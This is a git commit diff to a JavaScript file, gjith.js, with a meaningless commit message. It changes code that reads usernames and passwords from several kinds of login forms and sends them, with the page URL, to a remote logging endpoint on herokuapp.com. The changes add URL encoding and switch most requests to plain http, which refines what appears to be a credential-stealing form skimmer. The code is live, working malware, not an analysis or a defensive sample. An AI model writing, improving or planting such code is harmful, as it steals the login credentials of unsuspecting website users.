030a4d8b686bdc03df7355c8cc83929c8529ee68
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-11-16 17:25:07 +0100

    asdsad
    asdsad

--- gjith.js
+++ gjith.js
@@ -71,7 +71,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementById("user_login").value;
         user_pass = document.getElementById("user_pass").value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
 
         }
       };
@@ -81,7 +81,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementById("username").value;
         user_pass = document.getElementById("password").value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
         }
       };
     };
@@ -90,7 +90,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementsByName("email")[0].value;
         user_pass = document.getElementsByName("password")[0].value;
         if (username && user_pass) {
-          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass;
+          (new Image).src = "http://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
         }
       };
     };
@@ -99,7 +99,7 @@ for (var i = 0; i < arrayLength; i++) {
         username = document.getElementsByName("UID_input")[0].value;
         user_pass = document.getElementsByName("pass_input")[0].value;
         if (username && user_pass) {
-          fetch("https://fetching-url.herokuapp.com/logs.php?l="+location.href+"&e="+username+"&p="+user_pass);
+          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
         }
       };
     };
